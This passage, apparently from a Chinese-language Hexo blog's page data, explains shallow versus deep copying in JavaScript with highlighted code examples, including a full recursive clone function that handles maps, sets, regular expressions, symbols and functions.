result.lastIndex = targe.lastIndex;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cloneFunction</span>(<span class=\"params\">func</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> bodyReg = <span class=\"regexp\">/(?&lt;=&#123;)(.|\\n)+(?=&#125;)/m</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> paramReg = <span class=\"regexp\">/(?&lt;=\\().+(?=\\)\\s+&#123;)/</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> funcString = func.toString();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (func.prototype) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> param = paramReg.exec(funcString);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> body = bodyReg.exec(funcString);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (body) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (param) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">const</span> paramArr = param[<span class=\"number\">0</span>].split(<span class=\"string\">&#x27;,&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Function</span>(...paramArr, body[<span class=\"number\">0</span>]);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Function</span>(body[<span class=\"number\">0</span>]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">eval</span>(funcString);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cloneOtherType</span>(<span class=\"params\">targe, type</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> Ctor = targe.constructor;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (type) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> boolTag:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> numberTag:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> stringTag:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> errorTag:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> dateTag:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Ctor(targe);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> regexpTag:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cloneReg(targe);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> symbolTag:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cloneSymbol(targe);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> funcTag:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cloneFunction(targe);</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">clone</span>(<span class=\"params\">target, map = <span class=\"keyword\">new</span> <span class=\"built_in\">WeakMap</span>()</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 克隆原始类型</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isObject(target)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> target;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 初始化</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> type = getType(target);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> cloneTarget;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (deepTag.includes(type)) &#123;</span><br><span class=\"line\">        cloneTarget = getInit(target, type);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cloneOtherType(target, type);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 防止循环引用</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (map.get(target)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> map.get(target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    map.set(target, cloneTarget);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 克隆set</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (type === setTag) &#123;</span><br><span class=\"line\">        target.forEach(<span class=\"function\"><span class=\"params\">value</span> =&gt;</span> &#123;</span><br><span class=\"line\">            cloneTarget.add(clone(value, map));</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cloneTarget;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 克隆map</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (type === mapTag) &#123;</span><br><span class=\"line\">        target.forEach(<span class=\"function\">(<span class=\"params\">value, key</span>) =&gt;</span> &#123;</span><br><span class=\"line\">            cloneTarget.set(key, clone(value, map));</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cloneTarget;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 克隆对象和数组</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> keys = type === arrayTag ? <span class=\"literal\">undefined</span> : <span class=\"built_in\">Object</span>.keys(target);</span><br><span class=\"line\">    forEach(keys || target, <span class=\"function\">(<span class=\"params\">value, key</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (keys) &#123;</span><br><span class=\"line\">            key = value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        cloneTarget[key] = clone(target[key], map);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> cloneTarget;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">    clone</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"浅拷贝与深拷贝\"><a href=\"#浅拷贝与深拷贝\" class=\"headerlink\" title=\"浅拷贝与深拷贝\"></a>浅拷贝与深拷贝</h1><p><strong>浅拷贝</strong>只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存。<br><strong>深拷贝</strong>会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象。</p>\n<h3 id=\"浅拷贝\"><a href=\"#浅拷贝\" class=\"headerlink\" title=\"浅拷贝\"></a>浅拷贝</h3><h5 id=\"Object-assign\"><a href=\"#Object-assign\" class=\"headerlink\" title=\"Object.assign()\"></a><strong>Object.assign()</strong></h5><p><code>Object.assign()</code> 方法用于将所有可枚举属性的值从一个或多个源对象分配到目标对象。它将返回目标对象。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123; </span><br><span class=\"line\">  name: <span class=\"string\">&#x27;Jack&#x27;</span>,</span><br><span class=\"line\">  books: [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>],</span><br><span class=\"line\">  info: &#123;</span><br><span class=\"line\">    address: <span class=\"string\">&#x27;china&#x27;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> cloneObj = <span class=\"built_in\">Object</span>.assign(&#123;&#125;, obj);</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"扩展运算符\"><a href=\"#扩展运算符\" class=\"headerlink\" title=\"... 扩展运算符\"></a><code>...</code> 扩展运算符</h5><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123; </span><br><span class=\"line\">  name: <span class=\"string\">&#x27;Jack&#x27;</span>,</span><br><span class=\"line\">  books: [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>],</span><br><span class=\"line\">  info: &#123;</span><br><span class=\"line\">    address: <span class=\"string\">&#x27;china&#x27;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> cloneObj = &#123; ...obj &#125;;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Array-prototype-concat\"><a href=\"#Array-prototype-concat\" class=\"headerlink\" title=\"Array.prototype.concat()\"></a><code>Array.prototype.concat()</code></h5><p><code>Array.prototype.concat()</code> 用于合并两个或多个数组，并返回一个新的数组。为非变异方法，不会修改原数组。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, <span class=\"number\">4</span>], <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> cloneArr = arr.concat();</span><br></pre></td></tr></table></figure>\n\n\n<h5 id=\"Array-prototype-slice\"><a href=\"#Array-prototype-slice\" class=\"headerlink\" title=\"Array.prototype.slice()\"></a><code>Array.prototype.slice()</code></h5><p><code>Array.prototype.slice()</code> 方法返回一个新的数组对象，这一对象是一个由 <code>begin</code> 和 <code>end</code> 决定的原数组的浅拷贝（包括 <code>begin</code>，不包括 <code>end</code>）。原始数组不会被改变。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, [<span class=\"number\">3</span>, <span class=\"number\">4</span>], <span class=\"number\">5</span>];</span><br><span class=\"line\"><span class=\"keyword\">var</span> cloneArr = arr.slice();</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"深拷贝\"><a href=\"#深拷贝\" class=\"headerlink\" title=\"深拷贝\"></a>深拷贝</h3><p><strong>功能要点：</strong></p>\n<ul>\n<li>通用遍历</li>\n<li>类型判断</li>\n<li>递归调用</li>\n<li>拷贝函数</li>\n<li>循环引用</li>\n</ul>\n<blockquote>\n<p>JSON.stringfy()、JSON.parse()，无法处理函数（变为空对象）和正则（变为 null）</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">deepClone</span>(<span class=\"params\">obj, hash = <span class=\"keyword\">new</span> <span class=\"built_in\">WeakMap</span>()</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj === <span class=\"literal\">null</span>) <span class=\"keyword\">return</span> obj; <span class=\"comment\">// 如果是null或者undefined我就不进行拷贝操作</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj <span class=\"keyword\">instanceof</span> <span class=\"built_in\">Date</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>(obj);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (obj <span class=\"keyword\">instanceof</span> <span class=\"built_in\">RegExp</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(obj);</span><br><span class=\"line\">  <span class=\"comment\">// 可能是对象或者普通的值  如果是函数的话是不需要深拷贝</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> obj !== <span class=\"string\">&quot;object&quot;</span>) <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">  <span class=\"comment\">// 是对象的话就要进行深拷贝</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (hash.get(obj)) <span class=\"keyword\">return</span> hash.get(obj);</span><br><span class=\"line\">  <span class=\"keyword\">let</span> cloneObj = <span class=\"keyword\">new</span> obj.constructor();</span><br><span class=\"line\">  <span class=\"comment\">// 找到的是所属类原型上的constructor,而原型上的 constructor指向的是当前类本身</span></span><br><span class=\"line\">  hash.set(obj, cloneObj);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// 实现一个递归拷贝</span></span><br><span class=\"line\">      cloneObj[key] = deepClone(obj[key], hash);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> cloneObj;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ----- 完全版 ----</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> mapTag = <span class=\"string\">&#x27;[object Map]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> setTag = <span class=\"string\">&#x27;[object Set]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> arrayTag = <span class=\"string\">&#x27;[object Array]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> objectTag = <span class=\"string\">&#x27;[object Object]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> argsTag = <span class=\"string\">&#x27;[object Arguments]&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> boolTag = <span class=\"string\">&#x27;[object Boolean]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> dateTag = <span class=\"string\">&#x27;[object Date]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> numberTag = <span class=\"string\">&#x27;[object Number]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> stringTag = <span class=\"string\">&#x27;[object String]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> symbolTag = <span class=\"string\">&#x27;[object Symbol]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> errorTag = <span class=\"string\">&#x27;[object Error]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> regexpTag = <span class=\"string\">&#x27;[object RegExp]&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> funcTag = <span class=\"string\">&#x27;[object Function]&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> deepTag = [mapTag, setTag, arrayTag, objectTag, argsTag];</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">forEach</span>(<span class=\"params\">array, iteratee</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> index = -<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> length = array.length;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (++index &lt; length) &#123;</span><br><span class=\"line\">        iteratee(array[index], index);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> array;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isObject</span>(<span class=\"params\">target</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> type = <span class=\"keyword\">typeof</span> target;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> target !== <span class=\"literal\">null</span> &amp;&amp; (type === <span class=\"string\">&#x27;object&#x27;</span> || type === <span class=\"string\">&#x27;function&#x27;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getType</span>(<span class=\"params\">target</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.prototype.toString.call(target);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getInit</span>(<span class=\"params\">target</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> Ctor = target.constructor;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Ctor();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cloneSymbol</span>(<span class=\"params\">targe</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>(<span class=\"built_in\">Symbol</span>.prototype.valueOf.call(targe));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cloneReg</span>(<span class=\"params\">targe</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> reFlags = <span class=\"regexp\">/\\w*$/</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> result = <span class=\"keyword\">new</span> targe.constructor(targe.source, reFlags.exec(targe));</span><br><span class=\"line\">    result.lastIndex = targe.lastIndex;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cloneFunction</span>(<span class=\"params\">func</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> bodyReg = <span class=\"regexp\">/(?&lt;=&#123;)(.|\\n)+(?=&#125;)/m</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> paramReg = <span class=\"regexp\">/(?&lt;=\\().+(?=\\)\\s+&#123;)/</span>;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> funcString = func.toString();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (func.prototype) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> param = paramReg.exec(funcString);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> body = bodyReg.exec(funcString);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (body) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (param) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">const</span> paramArr = param[<span class=\"number\">0</span>].split(<span class=\"string\">&#x27;,&#x27;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Function</span>(...paramArr, body[<span class=\"number\">0</span>]);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Function</span>(body[<span class=\"number\">0</span>]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">eval</span>(funcString);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">cloneOtherType</span>(<span class=\"params\">targe, type</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> Ctor = targe.constructor;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (type) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> boolTag:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> numberTag:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> stringTag:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> errorTag:</span><br><span class=\"line\">        <span class=\"keyword\">case</span> dateTag:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Ctor(targe);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> regexpTag:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cloneReg(targe);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> symbolTag:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cloneSymbol(targe);</span><br><span class=\"line\">        <span class=\"keyword\">case</span> funcTag:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> cloneFunction(targe);</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">clone</span>(<span class=\"params\">target, map = <span class=\"keyword\">new</span> <span class=\"built_in\">WeakMap</span>()</span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 克隆原始类型</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isObject(target)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> target;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 初始化</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> type = getType(target);</span><br><span class=\"line\">    <span class=\"keyword\">let</span> cloneTarget;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (deepTag.includes(type)) &#123;</span><br><span class=\"line\">        cloneTarget = getInit(target, type);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cloneOtherType(target, type);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 防止循环引用</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (map.get(target)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> map.get(target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    map.set(target, cloneTarget);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 克隆set</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (type === setTag) &#123;</span><br><span class=\"line\">        target.forEach(<span class=\"function\"><span class=\"params\">value</span> =&gt;</span> &#123;</span><br><span class=\"line\">            cloneTarget.add(clone(value, map));</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cloneTarget;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 克隆map</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (type === mapTag) &#123;</span><br><span class=\"line\">        target.forEach(<span class=\"function\">(<span class=\"params\">value, key</span>) =&gt;</span> &#123;</span><br><span class=\"line\">            cloneTarget.set(key, clone(value, map));</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> cloneTarget;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 克隆对象和数组</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> keys = type === arrayTag ? <span class=\"literal\">undefined</span> : <span 